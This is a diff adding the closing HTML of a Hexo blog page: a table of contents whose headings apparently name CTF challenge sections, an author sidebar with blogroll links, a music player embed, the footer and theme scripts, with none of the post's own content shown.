+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#序列之争-Ordinal-Scale"><span class="nav-number">1.</span> <span class="nav-text">序列之争 - Ordinal Scale</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#二发入魂！"><span class="nav-number">2.</span> <span class="nav-text">二发入魂！</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Cosmos的二手市场"><span class="nav-number">3.</span> <span class="nav-text">Cosmos的二手市场</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Cosmos的留言板-2"><span class="nav-number">4.</span> <span class="nav-text">Cosmos的留言板-2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Cosmos的聊天室2-0"><span class="nav-number">5.</span> <span class="nav-text">Cosmos的聊天室2.0</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#At-last"><span class="nav-number">6.</span> <span class="nav-text">At last</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="瑟瑟发抖咸鱼黄"
+      src="/images/HeadPortrait.png">
+  <p class="site-author-name" itemprop="name">瑟瑟发抖咸鱼黄</p>
+  <div class="site-description" itemprop="description">您看！工具人啥都不配拥有!</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">38</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://gorgias.me/" title="https://gorgias.me/" rel="noopener" target="_blank">巨佬</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://couplee.wang/" title="http://couplee.wang/" rel="noopener" target="_blank">wnagzihxa1n</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.tity.xyz/" title="https://blog.tity.xyz/" rel="noopener" target="_blank">WarrenRyan</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://pukrr.github.io/" title="https://pukrr.github.io/" rel="noopener" target="_blank">pukrr</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://rinbn.com/" title="http://rinbn.com/" rel="noopener" target="_blank">Rinbn</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.imzj.top/" title="https://www.imzj.top/" rel="noopener" target="_blank">imzj</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://q0o0p.top" title="http://q0o0p.top" rel="noopener" target="_blank">q0o0p</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=40915694&auto=0&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">瑟瑟发抖咸鱼黄</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://muse.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.0
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":200,"height":400},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
